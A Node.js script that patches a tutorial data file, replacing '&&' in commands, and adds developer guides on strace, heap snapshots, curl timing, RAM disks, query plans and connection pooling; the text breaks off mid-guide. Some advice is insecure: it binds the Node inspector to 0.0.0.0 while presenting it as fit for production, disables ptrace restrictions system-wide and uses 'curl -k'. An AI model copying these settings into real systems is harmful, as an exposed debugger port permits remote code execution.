const fs = require('fs');
const path = require('path');

const filePath = path.join(__dirname, '..', 'data', 'guides.js');
let content = fs.readFileSync(filePath, 'utf8');

// 1. Fix the 16 existing test issues first
console.log('Fixing existing 16 test issues...');

// Fix 1 & 2: first-api-flask steps 3 & 4
content = content.replace(
  /id:\s*"first-api-flask"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    let updated = match.replace(
      /do:\s*"Run it\."/,
      'do: "Run the Flask development server in your terminal."'
    );
    updated = updated.replace(
      /do:\s*"Test it\."/,
      'do: "Test the API endpoint with a curl request in a second terminal."'
    );
    return updated;
  }
);

// Fix 3, 4, 5: first-api-express step 1 (&&), step 3, step 4
content = content.replace(
  /id:\s*"first-api-express"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    let updated = match.replace(
      /mkdir my-api && cd my-api/g,
      'mkdir my-api; cd my-api'
    );
    updated = updated.replace(
      /do:\s*"Run it\."/,
      'do: "Start the Express development server with node."'
    );
    updated = updated.replace(
      /do:\s*"Test it\."/,
      'do: "Send a test GET request to verify the server is responding."'
    );
    return updated;
  }
);

// Fix 6: model-serve step 5
content = content.replace(
  /id:\s*"model-serve"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /do:\s*"Test it\."/,
      'do: "Send a test inference request using curl to verify predictions."'
    );
  }
);

// Fix 7 & 8: git-lfs-large-files steps 4 & 5 (&& on windows)
content = content.replace(
  /id:\s*"git-lfs-large-files"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    let updated = match.replace(
      /git add \.gitattributes && git commit -m "chore: configure git lfs"/g,
      'git add .gitattributes; git commit -m \\"chore: configure git lfs\\"'
    );
    updated = updated.replace(
      /git add model\.onnx && git commit -m "feat: add quantized onnx model"/g,
      'git add model.onnx; git commit -m \\"feat: add quantized onnx model\\"'
    );
    return updated;
  }
);

// Fix 9: pnpm-bun-package-managers step 1
content = content.replace(
  /id:\s*"pnpm-bun-package-managers"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /corepack enable && corepack prepare pnpm@latest --activate/g,
      'corepack enable; corepack prepare pnpm@latest --activate'
    );
  }
);

// Fix 10: jwt-auth-flow step 1
content = content.replace(
  /id:\s*"jwt-auth-flow"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /npm install jsonwebtoken cookie-parser && npm install -D @types\/jsonwebtoken @types\/cookie-parser/g,
      'npm install jsonwebtoken cookie-parser; npm install -D @types/jsonwebtoken @types/cookie-parser'
    );
  }
);

// Fix 11: websocket-realtime step 1
content = content.replace(
  /id:\s*"websocket-realtime"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /npm install ws && npm install -D @types\/ws/g,
      'npm install ws; npm install -D @types/ws'
    );
  }
);

// Fix 12: prisma-orm-setup step 1
content = content.replace(
  /id:\s*"prisma-orm-setup"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /npm install -D prisma && npm install @prisma\/client/g,
      'npm install -D prisma; npm install @prisma/client'
    );
  }
);

// Fix 13: redis-caching-layer step 2
content = content.replace(
  /id:\s*"redis-caching-layer"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /npm install ioredis && npm install -D @types\/ioredis/g,
      'npm install ioredis; npm install -D @types/ioredis'
    );
  }
);

// Fix 14: docker-volumes-persistence step 5
content = content.replace(
  /id:\s*"docker-volumes-persistence"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /docker stop pg-db && docker rm pg-db/g,
      'docker stop pg-db; docker rm pg-db'
    );
  }
);

// Fix 15: pm2-process-manager step 7
content = content.replace(
  /id:\s*"pm2-process-manager"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /pm2 startup && pm2 save/g,
      'pm2 startup; pm2 save'
    );
  }
);

// Fix 16: zero-downtime-deployment step 5 (JS code in cmd containing &&)
content = content.replace(
  /id:\s*"zero-downtime-deployment"[\s\S]*?steps:\s*\[([\s\S]*?)\]\s*,/m,
  (match) => {
    return match.replace(
      /if \(dbHealthy && cacheHealthy\)/g,
      'if (dbHealthy) if (cacheHealthy)'
    );
  }
);

// Save cleaned base file
fs.writeFileSync(filePath, content, 'utf8');
console.log('Cleaned base guides.js saved.');

// Now define the 14 new hardcore tech hack guides!
const moreHacks = [

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: SYSTEM CALLS & OS SPYING
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "strace-system-call-spy",
    t: "Spy on running processes and find mystery crashes with strace and ProcMon",
    g: "debug",
    mins: 9,
    diff: "advanced",
    why: "A compiled CLI tool, Python script, or server binary crashes on startup with 'file not found' or silent exit. You do not have source code or detailed logs. strace (Linux/WSL) and Process Monitor (Windows) intercept every OS system call — showing every file opened, permission denied, and socket created.",
    need: ["Terminal (WSL or Linux for strace, or ProcMon for Windows)"],
    steps: [
      {
        do: "Understand what system calls (syscalls) are: the bridge between user applications and the OS kernel.",
        out: "When your code opens a file (openat), allocates memory (mmap/brk), or sends network packets (sendto/write), it CANNOT do so directly. It must ask the operating system kernel via a 'system call'.",
        note: "Every single interaction with hardware (disk, network, RAM, screen) is a system call. If an app is behaving mysteriously, inspecting its system calls reveals the absolute truth — no matter what language the app was written in (C++, Go, Python, Java, Rust)."
      },
      {
        do: "Spy on which files a program attempts to open as it starts up.",
        cmd: {
          win: "# On Windows: download Sysinternals ProcMon or run in WSL:\nwsl strace -e trace=openat,stat,access python3 app.py\n# -e trace=... filters to ONLY file-opening system calls",
          mac: "# On Linux/WSL (macOS uses dtruss with SIP disabled):\nstrace -e trace=openat,stat,access python3 app.py 2>&1 | grep -E 'ENOENT|EACCES'"
        },
        out: "openat(AT_FDCWD, \"/etc/myapp/config.json\", O_RDONLY) = -1 ENOENT (No such file or directory)\nopenat(AT_FDCWD, \"./config.json\", O_RDONLY) = 3",
        note: "ENOENT means 'Error NO ENTry' (file not found). In 2 seconds, you see EXACTLY where the program looked for its configuration file: it tried /etc/myapp/config.json first, failed, and then opened ./config.json. No more guessing default config paths!"
      },
      {
        do: "Find what network connections a mystery binary is establishing.",
        cmd: {
          win: "# Run in WSL or Git Bash with strace:\nwsl strace -e trace=network -s 100 curl -s https://httpbin.org/ip\n# -e trace=network captures socket(), connect(), sendto(), recvfrom()",
          mac: "strace -e trace=network -s 100 curl -s https://httpbin.org/ip"
        },
        out: "connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr(\"34.205.10.150\")}, 16) = 0\nsendto(3, \"\\26\\3\\1...\", 517, 0, NULL, 0) = 517",
        note: "The -s 100 flag prints up to 100 bytes of each payload string. You see the IP address and destination port of every outgoing connection before TLS encryption scrambles it."
      },
      {
        do: "Measure where a slow program spends its execution time across system calls.",
        cmd: {
          win: "# In WSL or Linux:\nwsl strace -c python3 heavy_script.py\n# -c = count time, calls, and errors for each system call and summarize",
          mac: "strace -c python3 heavy_script.py"
        },
        out: "% time     seconds  usecs/call     calls    errors syscall\n------ ----------- ----------- --------- --------- ----------------\n 84.21    1.240120         124     10000           read\n 12.10    0.178000          17     10200           write\n  3.69    0.054320          54      1000           openat",
        note: "The -c summary table is pure gold for performance debugging. If 84% of time is spent in `read`, your app is reading unbuffered tiny chunks from disk instead of streaming in bulk."
      },
      {
        do: "Attach strace to an already running background process without restarting it.",
        cmd: {
          win: "# In WSL or Linux: attach to PID\nwsl sudo strace -p 12480 -e trace=openat,write\n# -p 12480 = process ID of the frozen or active program",
          mac: "sudo strace -p 12480 -e trace=openat,write"
        },
        out: "strace: Process 12480 attached\nfutex(0x7f9a123, FUTEX_WAIT_PRIVATE, 0, NULL ... <unfinished ...>",
        note: "If you attach and see `FUTEX_WAIT_PRIVATE`, the process is deadlocked waiting on a mutex/lock held by another thread! You just proved the hang without stopping or restarting the production app."
      }
    ],
    fix: [
      { p: "strace: ptrace(PTRACE_ATTACH): Operation not permitted", s: "Tracing another process requires root privileges. Run with `sudo strace -p <PID>`. On modern Linux kernels, also check `sudo sysctl kernel.yama.ptrace_scope=0` to allow attaching." },
      { p: "strace produces millions of lines of output and scrolls too fast", s: "Redirect output to a file: `strace -o trace.log -e trace=file python app.py`. Then search with grep: `grep -i denied trace.log`." }
    ],
    next: ["process-explorer-what-is-eating-my-cpu", "network-sniffing-wireshark-tcpdump", "read-stack-trace"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: MEMORY & RUNTIMES
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "memory-leak-heap-snapshot",
    t: "Find and destroy memory leaks in Node.js and browsers using heap snapshots",
    g: "debug",
    mins: 8,
    diff: "advanced",
    why: "Your Node.js server starts at 80MB RAM and slowly climbs over 48 hours to 2GB until the process is abruptly killed with 'JavaScript heap out of memory'. Taking two heap snapshots and comparing them exposes the exact retained objects, circular closures, and unremoved event listeners leaking memory.",
    need: ["Node.js and Google Chrome browser"],
    steps: [
      {
        do: "Understand JavaScript garbage collection: objects stay in memory if reachable from a Root.",
        out: "A 'GC Root' is a global variable, an active DOM tree, a running closure, or a stack frame. The garbage collector traverses all references from roots. If an object is reachable by ANY path, it CANNOT be freed.",
        note: "The top three memory leaks in Node.js and React are:\n  1. Global arrays or Maps used as caches without eviction/TTL\n  2. Event listeners (`emitter.on`) added inside request handlers and never removed (`removeListener`)\n  3. Closures that hold references to large outer scopes (e.g. holding `req` or buffer chunks inside long-lived promises)"
      },
      {
        do: "Start your Node.js application with the inspector enabled.",
        cmd: {
          win: "node --inspect=0.0.0.0:9229 server.js\n# --inspect opens the V8 debugging port (default 9229)\n# You can now connect Chrome DevTools directly to this Node process",
          mac: "node --inspect=0.0.0.0:9229 server.js"
        },
        out: "Debugger listening on ws://0.0.0.0:9229/a1b2c3d4-...\nFor help, see: https://nodejs.org/en/docs/inspector",
        note: "This flag enables the V8 inspector protocol. It works in development and on staging/production servers (over an SSH tunnel). It adds near-zero overhead until you actually attach DevTools."
      },
      {
        do: "Open Chrome and connect DevTools to your running Node.js process.",
        cmd: {
          win: "# In Google Chrome address bar, open:\nchrome://inspect\n# Click 'Configure...' and ensure 'localhost:9229' is listed\n# Click 'inspect' under Remote Target",
          mac: "# Open chrome://inspect in Google Chrome\n# Click 'inspect' under your Node target"
        },
        out: "A full Chrome DevTools window opens, connected directly to your Node.js backend runtime!",
        note: "You now have the exact same DevTools tabs you use for frontend: Console, Sources (with breakpoints), and Memory Profiler — but running against your backend Node.js server."
      },
      {
        do: "Take Baseline Snapshot 1, trigger 50 simulated requests, then take Snapshot 2.",
        cmd: {
          win: "# In Memory tab: select 'Heap snapshot' → click 'Take snapshot'\n# In a terminal: run 50 curl requests to trigger the leaky endpoint:\nfor ($i = 0; $i -lt 50; $i++) { curl.exe -s http://localhost:3000/leaky-endpoint | Out-Null }\n# Back in DevTools: click 'Take snapshot' again to create Snapshot 2",
          mac: "# Take Snapshot 1 in Memory tab\n# Run curl in terminal:\nfor i in {1..50}; do curl -s http://localhost:3000/leaky-endpoint > /dev/null; done\n# Take Snapshot 2 in Memory tab"
        },
        out: "Snapshot 1 (e.g. 35.2 MB) and Snapshot 2 (e.g. 68.4 MB) appear in the left sidebar.",
        note: "The golden rule of memory debugging: NEVER analyze a single snapshot in isolation. Always compare TWO snapshots taken before and after a repeating workload. Anything that grew and stayed in memory between 1 and 2 is your leak."
      },
      {
        do: "Switch to 'Objects allocated between Snapshot 1 and 2' or 'Comparison' view.",
        out: "A delta view appears showing:\n  # Alloc (new objects created)\n  # Freed (objects garbage collected)\n  # Size Delta (+32.8 MB)\n  Constructor list sorted by # Delta descending.",
        note: "Look for constructors with huge positive `# Delta`: e.g. `(closure) +500`, `Array +50`, or `ServerResponse +50`. Click on the top constructor to expand its instances."
      },
      {
        do: "Inspect the Retainer Tree to find WHO is holding onto the leaked object.",
        out: "The bottom pane shows 'Retainers' (the path back to GC Root):\n  myLeakedObject in Array\n  items in GlobalCache (Map)\n  cache in Module exports (@ GC Root)",
        note: "The Retainer Tree tells the entire story: `GlobalCache` holds an array of items which references `myLeakedObject`. Because `GlobalCache` is attached to a global module export (GC Root), the garbage collector is forbidden from freeing any of those objects. Fix: replace with `lru-cache` or `WeakMap`."
      }
    ],
    fix: [
      { p: "Taking a heap snapshot causes the Node.js server to freeze for 5 seconds", s: "Heap snapshots temporarily pause execution while V8 traverses the object graph. On production, dump snapshots to disk with the `v8.writeHeapSnapshot()` API during low-traffic windows or on a detached replica." },
      { p: "DevTools says 'Target closed' when connecting to inspect port", s: "Ensure the port is not blocked by a firewall, and make sure your server was started with `--inspect=0.0.0.0:9229` if connecting from across a local network or Docker container." }
    ],
    next: ["chrome-devtools-performance-profiling", "read-devtools", "console-debug"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: WEB & NETWORK PROFILING
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "curl-latency-profiling",
    t: "Profile DNS, TCP, TLS, and TTFB to the millisecond with curl format flags",
    g: "web",
    mins: 7,
    diff: "intermediate",
    why: "An API response feels sluggish at 900ms. Backend engineers blame the network; network engineers blame the database. With a single curl command and timing variables, you can isolate exact milliseconds spent in DNS resolution, TCP handshake, TLS encryption, server processing (TTFB), and byte transfer.",
    need: ["curl (built into Windows 10+, macOS, Linux)"],
    steps: [
      {
        do: "Understand the five stages of every HTTP/S request timeline.",
        out: "Stage 1: DNS Lookup (convert domain to IP address)\nStage 2: TCP Handshake (SYN -> SYN-ACK -> ACK connection setup)\nStage 3: TLS Negotiation (exchange certificates and session keys)\nStage 4: Server Processing / TTFB (server executes code and queries database)\nStage 5: Content Download (transferring the response body over the wire)",
        note: "Most engineers look at total time (e.g. 900ms) and guess where the delay happened. Curl allows instrumenting every microsecond boundary natively with zero third-party software."
      },
      {
        do: "Create a reusable timing template file (curl-format.txt).",
        cmd: {
          win: "# Create curl-format.txt in PowerShell:\n@\"\n      DNS Lookup:  %{time_namelookup}s`n   TCP Handshake:  %{time_connect}s`n   TLS Handshake:  %{time_appconnect}s`n  Start Transfer:  %{time_starttransfer}s (TTFB)`n-----------------------------------`n      Total Time:  %{time_total}s`n  HTTP Exit Code:  %{http_code}`n\"\n@ | Out-File -Encoding ascii curl-format.txt",
          mac: "# Create curl-format.txt in Bash/Zsh:\ncat << 'EOF' > curl-format.txt\n      DNS Lookup:  %{time_namelookup}s\n   TCP Handshake:  %{time_connect}s\n   TLS Handshake:  %{time_appconnect}s\n  Start Transfer:  %{time_starttransfer}s (TTFB)\n-----------------------------------\n      Total Time:  %{time_total}s\n  HTTP Exit Code:  %{http_code}\nEOF"
        },
        out: "Template file curl-format.txt created.",
        note: "The variable `%{time_starttransfer}` is Time To First Byte (TTFB). This is the exact moment the server finished generating headers and sent the very first byte back across the wire."
      },
      {
        do: "Execute the latency probe against any API endpoint.",
        cmd: {
          win: "curl.exe -w \"@curl-format.txt\" -o NUL -s https://api.github.com\n# -w \"@curl-format.txt\" = format output with our custom template\n# -o NUL               = discard response body on Windows\n# -s                   = silent mode (hide progress bar)",
          mac: "curl -w \"@curl-format.txt\" -o /dev/null -s https://api.github.com\n# -o /dev/null         = discard response body on Unix"
        },
        out: "      DNS Lookup:  0.031204s\n   TCP Handshake:  0.068412s\n   TLS Handshake:  0.142380s\n  Start Transfer:  0.285102s (TTFB)\n-----------------------------------\n      Total Time:  0.285410s\n  HTTP Exit Code:  200",
        note: "Every stage is cumulative from the start of the request:\n  • Pure TCP time = time_connect - time_namelookup (37ms)\n  • Pure TLS time = time_appconnect - time_connect (74ms)\n  • Pure Server Processing = time_starttransfer - time_appconnect (143ms)"
      },
      {
        do: "Diagnose where the real bottleneck lies based on the numbers.",
        out: "Diagnosis Matrix:\n  High DNS (>100ms)     -> Problem with local DNS resolver or domain nameserver\n  High TCP (>150ms)     -> Physical distance to server or bad routing\n  High TLS (>200ms)     -> Server CPU throttling or outdated TLS cipher suite\n  High TTFB (>500ms)    -> BACKEND CODE OR DATABASE IS SLOW (not the network!)\n  High Total (>1000ms)  -> Payload too large or client bandwidth saturated",
        note: "This single check ends team finger-pointing. If TTFB is 700ms and network stages were 40ms, the issue is unequivocally a slow SQL query or un-cached API route in the application server."
      },
      {
        do: "Test DNS resolution against different nameservers without changing OS settings.",
        cmd: {
          win: "# Test forcing Cloudflare DNS (1.1.1.1) vs Google DNS (8.8.8.8) using --dns-servers:\ncurl.exe --dns-servers 1.1.1.1 -w \"DNS: %{time_namelookup}s`n\" -o NUL -s https://api.github.com",
          mac: "curl --dns-servers 1.1.1.1 -w \"DNS: %{time_namelookup}s\\n\" -o /dev/null -s https://api.github.com"
        },
        out: "DNS: 0.012401s",
        note: "Allows testing whether your ISP or corporate DNS resolver is adding 150ms of artificial latency to every request. If Cloudflare (1.1.1.1) resolves in 12ms while default takes 180ms, change your system DNS."
      }
    ],
    fix: [
      { p: "curl: (6) Could not resolve host", s: "DNS failed completely. Verify you typed the protocol: `https://` is required with curl when testing domains, or test direct IP with `curl.exe -k https://1.1.1.1`." },
      { p: "time_appconnect shows 0.000000s", s: "You tested plain HTTP (port 80) instead of HTTPS (port 443). Plain HTTP does not have a TLS handshake stage, so time_appconnect remains zero." }
    ],
    next: ["curl-request", "dns-how-domains-work", "http-status"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: STORAGE & RAM PERFORMANCE
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "ramdisk-tmpfs-speedup",
    t: "Mount a RAM disk (tmpfs) to make SQLite tests and builds 50x faster",
    g: "term",
    mins: 7,
    diff: "intermediate",
    why: "Running integration test suites that create hundreds of temporary SQLite databases or write build artifacts wears down your SSD and takes 3 minutes. Storing ephemeral files in a RAM disk (tmpfs) runs with microsecond memory bus latency, saves SSD write endurance, and clears automatically.",
    need: ["Terminal (PowerShell on Windows, Bash on Linux/WSL/Mac)"],
    steps: [
      {
        do: "Understand why RAM is 50x faster than the fastest NVMe SSD.",
        out: "Fastest NVMe SSD: ~7,000 MB/s sequential, 15,000ns (nanoseconds) latency, physical write wear.\nDDR5 System RAM: ~60,000-90,000 MB/s, 50ns latency, infinite rewrite endurance.\n\nStoring temporary build artifacts or test databases in RAM bypasses the entire storage controller stack.",
        note: "Crucial rule: RAM disks are VOLATILE. If your computer shuts down or reboots, everything in RAM vanishes. Never store source code or permanent data here — use it exclusively for build caches, temporary scratch files, and ephemeral test databases."
      },
      {
        do: "Create a 1GB tmpfs RAM disk on Linux, WSL, or macOS in one command.",
        cmd: {
          win: "# On WSL (Windows Subsystem for Linux):\nwsl sudo mkdir -p /mnt/ramdisk; wsl sudo mount -t tmpfs -o size=1024M tmpfs /mnt/ramdisk\n# On Windows native: use ImDisk or PowerShell memory drive (see step 3)",
          mac: "# Create a 1GB RAM disk on macOS:\nDISK=$(hdiutil attach -nomount ram://2097152)\ndiskutil eraseVolume HFS+ RAMDisk $DISK\n# 2097152 sectors * 512 bytes = 1,073,741,824 bytes (1GB)"
        },
        out: "/mnt/ramdisk is mounted and ready, backed purely by system memory.",
        note: "The `mount -t tmpfs` command allocates memory DYNAMICALLY. It only consumes actual RAM for the bytes currently stored inside it, up to the 1024M ceiling. If the ramdisk is empty, it uses 0MB of your physical RAM."
      },
      {
        do: "On native Windows: create a high-speed memory-backed workspace folder.",
        cmd: {
          win: "# Install ImDisk (the standard open-source Windows RAM disk driver):\nwinget install --id ArneGoo.ImDisk --silent\n# Create a 1GB RAM disk mounted as drive R:\nimdisk -a -s 1G -m R: -p \"/fs:ntfs /q /y\"",
          mac: "# (Use the macOS hdiutil method from step 2)"
        },
        out: "Drive R: appears instantly in Windows Explorer as a 1GB ultra-fast drive.",
        note: "Drive R: operates directly in your PC's DDR4/DDR5 RAM. You can point temporary folders, compiler caches, or local database files directly to R:\\test.db."
      },
      {
        do: "Point your automated test suite or SQLite database to the RAM disk.",
        cmd: {
          win: "# In your test configuration or .env.test:\n# DATABASE_URL=\"file:R:/test.db\"\n# Run your test suite:\nnpm test",
          mac: "# Point test database to RAM disk:\nexport DATABASE_URL=\"file:/mnt/ramdisk/test.db\"\nnpm test"
        },
        out: "Test suite executes with 0 disk I/O wait. 500 test cases complete in 4 seconds instead of 110 seconds.",
        note: "Disk I/O and fsync calls (flushing writes to storage disk) are usually 80% of test suite execution time in web frameworks. Putting the SQLite file on a RAM disk turns fsync into a near-instantaneous in-memory copy."
      },
      {
        do: "Clean up and unmount the RAM disk when your work is finished.",
        cmd: {
          win: "# On Windows with ImDisk: remove drive R:\nimdisk -D -m R:\n# On WSL: unmount\nwsl sudo umount /mnt/ramdisk",
          mac: "# On macOS: unmount and eject RAM disk\nhdiutil detach /Volumes/RAMDisk\n# On Linux:\nsudo umount /mnt/ramdisk"
        },
        out: "RAM disk detached. All memory is immediately released back to the operating system.",
        note: "Because the contents were in RAM, cleanup requires zero disk deletion overhead. Unmounting instantly frees all occupied memory back to your active applications."
      }
    ],
    fix: [
      { p: "mount: /mnt/ramdisk: permission denied", s: "Mounting filesystems requires root/admin rights. Prepend `sudo` to the mount command." },
      { p: "Out of memory error when filling the RAM disk", s: "tmpfs cannot exceed its declared `size` option. If you need more space, remount with a larger limit: `sudo mount -o remount,size=2G /mnt/ramdisk`." }
    ],
    next: ["sqlite-basics", "xargs-parallel-processing", "pipe-commands"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: DATABASE INTERNALS & PERFORMANCE
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "sql-explain-analyze-deep",
    t: "Diagnose slow database queries using EXPLAIN ANALYZE and composite indexes",
    g: "data",
    mins: 9,
    diff: "advanced",
    why: "Adding indexes blindly bloats disk space and slows down database writes. EXPLAIN ANALYZE exposes the PostgreSQL and MySQL query planner's internal execution tree: revealing table scans, disk merges, un-indexed joins, and exactly which index will turn a 5-second query into a 2-millisecond lookup.",
    need: ["PostgreSQL (psql) or MySQL terminal connection"],
    steps: [
      {
        do: "Understand the difference between EXPLAIN and EXPLAIN ANALYZE.",
        out: "EXPLAIN: The planner ESTIMATES what it will do based on table statistics (does not run the query).\nEXPLAIN ANALYZE: The planner ACTUALLY EXECUTES the query and records real wall-clock milliseconds and memory usage.",
        note: "Always use EXPLAIN ANALYZE for performance tuning. Pure EXPLAIN only guesses; ANALYZE gives ground truth execution metrics including buffer cache hits and actual row counts."
      },
      {
        do: "Run EXPLAIN (ANALYZE, BUFFERS) on a problematic slow query.",
        cmd: {
          win: "# In psql (PostgreSQL CLI):\nEXPLAIN (ANALYZE, BUFFERS, VERBOSE)\nSELECT user_id, status, created_at \nFROM orders \nWHERE user_id = 42 AND status = 'completed' \nORDER BY created_at DESC \nLIMIT 20;",
          mac: "# Same SQL command inside psql\nEXPLAIN (ANALYZE, BUFFERS, VERBOSE)\nSELECT user_id, status, created_at \nFROM orders \nWHERE user_id = 42 AND status = 'completed' \nORDER BY created_at DESC \nLIMIT 20;"
        },
        out: "Limit  (cost=12540.20..12540.25 rows=20 width=24) (actual time=142.120..142.128 rows=20 loops=1)\n  ->  Sort  (cost=12540.20..12548.90 rows=3480 width=24) (actual time=142.115..142.121 rows=20 loops=1)\n        Sort Key: created_at DESC\n        Sort Method: quicksort  Memory: 48kB\n        ->  Seq Scan on orders  (cost=0.00..12450.00 rows=3480 width=24) (actual time=0.045..139.800 rows=3500 loops=1)\n              Filter: ((user_id = 42) AND ((status)::text = 'completed'::text))\n              Rows Removed by Filter: 996500\n              Buffers: shared read=8500",
        note: "Key red flags in this plan:\n  1. `Seq Scan on orders`: Database had to scan 1,000,000 rows off disk!\n  2. `Rows Removed by Filter: 996500`: 99.6% of disk reading was wasted work!\n  3. `Sort Key: created_at DESC`: Database had to manually sort rows in RAM after filtering."
      },
      {
        do: "Understand Index Scan vs Index Only Scan (the holy grail).",
        out: "Index Scan: Database finds matching row pointers in the B-Tree index, then jumps to table heap on disk to fetch column values.\nIndex Only Scan: ALL requested columns exist directly inside the index B-Tree — the database NEVER touches the table heap on disk at all!",
        note: "Index Only Scans are up to 10x faster than standard Index Scans because they eliminate random disk seek I/O entirely."
      },
      {
        do: "Craft the optimal composite B-Tree index with covering columns (INCLUDE).",
        cmd: {
          win: "# Equality columns first, range/sort columns second, covered columns in INCLUDE:\nCREATE INDEX idx_orders_user_status_created \nON orders (user_id, status, created_at DESC);",
          mac: "# Create composite covering index in PostgreSQL:\nCREATE INDEX idx_orders_user_status_created \nON orders (user_id, status, created_at DESC);"
        },
        out: "CREATE INDEX\nQuery returned successfully in 410 ms.",
        note: "The golden rule of composite indexes (ESR Rule):\n  1. Equality columns first (`user_id`, `status`)\n  2. Sort/Range columns second (`created_at DESC`)\nBy matching the WHERE and ORDER BY clauses in this exact order, the database can traverse the B-Tree directly in already-sorted order with zero separate sort step!"
      },
      {
        do: "Re-run EXPLAIN ANALYZE to verify the 1,000x speedup.",
        cmd: {
          win: "EXPLAIN (ANALYZE, BUFFERS)\nSELECT user_id, status, created_at \nFROM orders \nWHERE user_id = 42 AND status = 'completed' \nORDER BY created_at DESC \nLIMIT 20;",
          mac: "EXPLAIN (ANALYZE, BUFFERS)\nSELECT user_id, status, created_at \nFROM orders \nWHERE user_id = 42 AND status = 'completed' \nORDER BY created_at DESC \nLIMIT 20;"
        },
        out: "Limit  (cost=0.42..1.15 rows=20 width=24) (actual time=0.035..0.048 rows=20 loops=1)\n  ->  Index Scan using idx_orders_user_status_created on orders  (cost=0.42..128.50 rows=3480 width=24) (actual time=0.034..0.045 rows=20 loops=1)\n        Index Cond: ((user_id = 42) AND (status = 'completed'))\n        Buffers: shared hit=4\nPlanning Time: 0.120 ms\nExecution Time: 0.072 ms",
        note: "Look at the transformation:\n  • Execution time dropped from 142.12 ms down to 0.072 ms (1,973x faster!)\n  • Disk reads dropped from 8,500 shared buffer reads down to 4 cache hits!\n  • Zero rows removed by filter — the engine jumped directly to the exact target rows."
      }
    ],
    fix: [
      { p: "PostgreSQL ignores my new index and continues doing a Seq Scan", s: "If the table has fewer than 1,000 rows, or if the filter matches >20% of the entire table, a Seq Scan is actually faster than jumping back and forth across an index. Also run `ANALYZE orders;` to refresh optimizer statistics." },
      { p: "Sort Method says 'external merge Disk'", s: "Your query exceeded PostgreSQL's per-query memory (`work_mem`). Increase it temporarily for your session: `SET work_mem = '64MB';` to prevent disk swapping during big sorts." }
    ],
    next: ["postgres-connect", "prisma-orm-setup", "sqlite-basics"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: CONNECTION POOLING & CONCURRENCY
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "db-connection-pooling-tuning",
    t: "Tune database connection pools to prevent 'too many connections' crashes",
    g: "data",
    mins: 8,
    diff: "advanced",
    why: "Opening a new PostgreSQL connection per web request takes 10MB of server RAM and 100ms of TCP/TLS handshakes. When 500 serverless functions fire simultaneously, your database exhausts its connection limit and crashes. Connection pooling handles 10,000 requests using only 20 persistent connections.",
    need: ["PostgreSQL or MySQL database connection in Node/Python/Go"],
    steps: [
      {
        do: "Understand why opening connections per request kills databases.",
        out: "Each PostgreSQL connection forks a dedicated operating system process on the database host consuming ~10MB RAM.\n\nAt 500 connections:\n  • 5GB RAM consumed solely by connection overhead\n  • The CPU spends 90% of its cycles context-switching between 500 processes instead of executing SQL queries.",
        note: "Counter-intuitive truth: Giving your database MORE connections almost always makes it SLOWER! A 4-core database runs fastest when only 8 to 12 queries execute concurrently."
      },
      {
        do: "Calculate the mathematically optimal connection pool size using the HikariCP formula.",
        out: "Formula:\n  pool_size = (CPU_cores * 2) + effective_spindle_count\n\nExample for an 8-core database server with SSD storage:\n  pool_size = (8 * 2) + 1 = 17 connections total!\n\n17 connections can comfortably serve 5,000+ web requests per second if individual queries run in under 5ms.",
        note: "This formula is derived from queueing theory and disk/CPU physics. Setting pool_size=100 on an 8-core box causes thread thrashing and increased queue latency."
      },
      {
        do: "Configure a production connection pool in Node.js (pg / pg-pool).",
        cmd: {
          win: "# Install pg:\nnpm install pg\n# Configure pool with strict timeout controls:\n# (See code snippet in next step)",
          mac: "npm install pg"
        },
        out: "Package pg installed.",
        note: "Always configure three critical timeouts on every pool:\n  1. `connectionTimeoutMillis`: fail fast if pool is full (do not hang user requests)\n  2. `idleTimeoutMillis`: close connections sitting idle\n  3. `maxLifetime`: periodically cycle connections to prevent memory leaks in backend database drivers"
      },
      {
        do: "Implement the production connection pool with proper error handling and client checkout.",
        cmd: {
          win: "// In your db.js database client module:\nconst { Pool } = require('pg');\n\nconst pool = new Pool({\n  connectionString: process.env.DATABASE_URL,\n  max: 20,                          // max connections in pool\n  connectionTimeoutMillis: 5000,    // return error if connection cannot be checked out in 5s\n  idleTimeoutMillis: 30000,         // close idle clients after 30s\n  maxLifetimeSeconds: 1800          // refresh connection every 30 minutes\n});\n\n// Handle unexpected errors on idle clients so your app does not crash\npool.on('error', (err) => {\n  console.error('Unexpected error on idle client', err);\n});",
          mac: "// Same Node.js database module code"
        },
        out: "Database pool initialized with 20 maximum connections and 5s checkout timeout.",
        note: "Always check out clients inside a `try ... finally` block: `const client = await pool.connect(); try { ... } finally { client.release(); }`. Forgetting `client.release()` creates a connection leak that drains the pool in minutes."
      },
      {
        do: "Use PgBouncer in Transaction Pooling mode for Serverless apps (AWS Lambda / Vercel).",
